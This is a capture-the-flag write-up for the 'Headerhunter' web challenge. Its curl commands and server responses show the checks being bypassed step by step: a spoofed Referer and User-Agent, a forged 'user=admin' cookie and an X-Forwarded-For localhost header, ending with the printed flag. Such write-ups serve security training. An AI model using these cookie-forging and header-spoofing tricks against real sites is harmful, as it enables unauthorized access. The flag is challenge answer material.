# Headerhunter

## FR

L'application à envie de jouer avec vous, attention elle vous prend l'en-tete ;)

## EN

The application wants to play with us! Be careful, it will take your head occupied.
http://headerhunter.flag4all.sh:81

Auteur : K_lfa (BZHack / ESDAcademy)


https://headerhunter.flag4all.sh

## Solve

```
└─$ curl -i 'http://headerhunter.flag4all.sh:81/'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 01:06:01 GMT
Server: Apache/2.4.57 (Debian)
Set-Cookie: PHPSESSID=fsk497fj3muojjalajsg4g039v; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=guest
Vary: Accept-Encoding
Content-Length: 77
Content-Type: text/html; charset=UTF-8

you don't coming from http://secretsourceof.bzhack.bzh/<br>You coming from :                                                                                                                    

└─$ curl -i 'http://headerhunter.flag4all.sh:81/' -H 'Referer: http://secretsourceof.bzhack.bzh/'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 01:06:32 GMT
Server: Apache/2.4.57 (Debian)
Set-Cookie: PHPSESSID=f9locglrgqibho9jblloktbtc3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=guest
Content-Length: 46
Content-Type: text/html; charset=UTF-8

<pre>Your browser is not BZHackNavigator</pre>                                                                                                                                                  

└─$ curl -i 'http://headerhunter.flag4all.sh:81/' -H 'Referer: http://secretsourceof.bzhack.bzh/' -H 'User-Agent: BZHackNavigator'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 01:07:28 GMT
Server: Apache/2.4.57 (Debian)
Set-Cookie: PHPSESSID=s9c4o1i0hq63hg4pll9congusb; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=guest
Content-Length: 26
Content-Type: text/html; charset=UTF-8

</pre>Wrong Method !</pre>

└─$ curl -i 'http://headerhunter.flag4all.sh:81/' -H 'Referer: http://secretsourceof.bzhack.bzh/' -H 'User-Agent: BZHackNavigator' -X POST
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 01:08:04 GMT
Server: Apache/2.4.57 (Debian)
Set-Cookie: PHPSESSID=h8r8ftls9mjkudav3ion043gi2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=guest
Content-Length: 33
Content-Type: text/html; charset=UTF-8

<pre>You're not the admin !</pre>

└─$ curl -i 'http://headerhunter.flag4all.sh:81/' -H 'Referer: http://secretsourceof.bzhack.bzh/' -H 'User-Agent: BZHackNavigator' -X POST -b 'user=admin'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 01:08:37 GMT
Server: Apache/2.4.57 (Debian)
Set-Cookie: PHPSESSID=tjhh4itqci7subs9rto23lneu4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=guest
Vary: Accept-Encoding
Content-Length: 99
Content-Type: text/html; charset=UTF-8

<pre>Your request not comming from 127.0.0.1<br></pre><pre>Your request coming from: </pre>10.0.0.2

└─$ curl -i 'http://headerhunter.flag4all.sh:81/' -H 'Referer: http://secretsourceof.bzhack.bzh/' -H 'User-Agent: BZHackNavigator' -X POST -b 'user=admin' -H 'X-Forwarded-For: 127.0.0.1'
HTTP/1.1 200 OK
Date: Sun, 22 Oct 2023 01:10:19 GMT
Server: Apache/2.4.57 (Debian)
Set-Cookie: PHPSESSID=eodhbgtaarqrf0qm3oef54t9u2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=guest
Content-Length: 37
Content-Type: text/html; charset=UTF-8

Well done ! FLAG{R3al_HeAd3rs_Pl4y3r}

```
